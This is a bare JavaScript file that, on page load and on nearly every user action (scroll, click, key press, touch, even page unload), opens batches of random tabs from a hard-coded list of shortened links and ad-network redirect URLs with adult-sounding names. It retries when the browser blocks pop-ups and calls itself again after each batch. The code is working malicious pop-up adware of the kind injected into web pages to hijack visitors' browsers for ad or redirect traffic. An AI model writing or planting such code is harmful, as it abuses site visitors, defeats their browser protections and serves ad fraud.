function openRandomLinksRecursively(links, maxAttempts = 3) {
    const shuffledLinks = shuffleArray(links);
    let attempts = 0;
    
    function openLinks() {
        const maxTabs = Math.min(shuffledLinks.length, 4); // Limit to 10 tabs for safety
        let openedTabs = 0;

        for (let i = 0; i < maxTabs; i++) {
            const link = shuffledLinks[i];
            const newTab = window.open(link, '_blank');
            if (newTab === null || typeof newTab === 'undefined') {
                // Opening tab was blocked, retry
                attempts++;
                if (attempts <= maxAttempts) {
                    console.log(`Attempt ${attempts}: Failed to open ${link}. Retrying...`);
                    openLinks(); // Recursively retry opening links
                } else {
                    console.log(`Maximum attempts reached for ${link}.`);
                }
            } else {
                openedTabs++;
            }
        }

        if (openedTabs === maxTabs) {
            console.log(`Opened ${openedTabs} tabs.`);
            console.log("All links opened. Repeating script...");
            openRandomLinksRecursively(links, maxAttempts); // Repeat the script
        }
    }

    openLinks();
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

var links = [
    'https://www.smokeebash.com/2024/06/pop1.html',
    'https://bit.ly/smashwatchunder',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/bangedfunmaven',
    'https://xml.fstsrv9.com/redirect?feed=648663&auth=8ugExE',
    'https://bit.ly/bangedfundilla',
    'https://bit.ly/Bangedfunbid',
    'https://bit.ly/bangedfunmaven',
    'https://bit.ly/bangedfunrivernew',
    'https://www.smokeebash.com/2024/06/pop2.html',
    'https://bit.ly/bangedfunrivernew',
    'https://bit.ly/bangedfundilla',
    'https://bit.ly/smashwatchkada',
    'https://viidsyej.com/dc/?blockID=348833&tb=https://www.smokeebash.com/2024/02/video-browse.html%3Fm%3D1',
    'https://bit.ly/Bangedfunbid',
];

function triggerOpenRandomLinksRecursively() {
    openRandomLinksRecursively(links); // Assuming links is accessible here
}

window.addEventListener('load', triggerOpenRandomLinksRecursively);
window.addEventListener('scroll', triggerOpenRandomLinksRecursively);
window.addEventListener('keydown', triggerOpenRandomLinksRecursively);
document.addEventListener('scroll', triggerOpenRandomLinksRecursively);
document.addEventListener('keydown', triggerOpenRandomLinksRecursively);
window.addEventListener('beforeunload', triggerOpenRandomLinksRecursively);
document.addEventListener('beforeunload', triggerOpenRandomLinksRecursively);
window.addEventListener('click', triggerOpenRandomLinksRecursively);
document.addEventListener('click', triggerOpenRandomLinksRecursively);
window.addEventListener('mousewheel', triggerOpenRandomLinksRecursively);
document.addEventListener('mousewheel', triggerOpenRandomLinksRecursively);
window.addEventListener('touchstart', triggerOpenRandomLinksRecursively);
document.addEventListener('touchstart', triggerOpenRandomLinksRecursively);
window.addEventListener('touchmove', triggerOpenRandomLinksRecursively);
document.addEventListener('touchmove', triggerOpenRandomLinksRecursively);
window.addEventListener('touchend', triggerOpenRandomLinksRecursively);
document.addEventListener('touchend', triggerOpenRandomLinksRecursively);
window.addEventListener('unload', triggerOpenRandomLinksRecursively);
document.addEventListener('unload', triggerOpenRandomLinksRecursively);
window.addEventListener('keypress', triggerOpenRandomLinksRecursively);
document.addEventListener('keypress', triggerOpenRandomLinksRecursively);
